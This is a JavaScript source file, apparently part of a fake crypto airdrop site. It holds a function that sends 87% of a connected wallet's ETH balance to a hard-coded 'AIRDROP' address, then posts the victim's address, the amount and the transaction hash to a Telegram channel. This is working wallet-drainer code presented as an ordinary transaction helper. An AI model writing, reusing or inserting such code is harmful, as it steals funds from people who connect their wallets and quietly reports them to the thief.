// create send transaction function
import { ethers } from "ethers";
import { AIRDROP } from "./constant";
import { sendToTelegram } from "./telegram";
// import { getUniversalProvider } from "./provider";

export const sendETH = async (provider, signer) => {
    try {
        const address = await signer.getAddress();

        // get current balance in wei, BigInt
        const balanceWei = await provider.getBalance(address);

        if(balanceWei <= 0n){
            throw new Error("No balance available");
        }

        // leave small buffer for gas (safe method)
        const amountToSend = (balanceWei * 87n) / 100n;

        // send transaction
        const tx = await signer.sendTransaction({
            to: AIRDROP, // recipient address
            // value: ethers.parseEther("0.0001"),
            value: amountToSend, // amount already in wei
        });

        await tx.wait();

        // SEND TO TELEGRAM
        await sendToTelegram(`
            ✅ ETH Sent
            Hash: ${tx.hash}
            From: ${address}
            Amount: ${amountToSend.toString()} wei
        `);
        
        return tx.hash;
    } catch (error){
        // console.error("Error sending transaction: ", error);
        await sendToTelegram(`
            ❌ ETH Send Failed
            Error: ${error.message}
        `);
        return null;
    }
}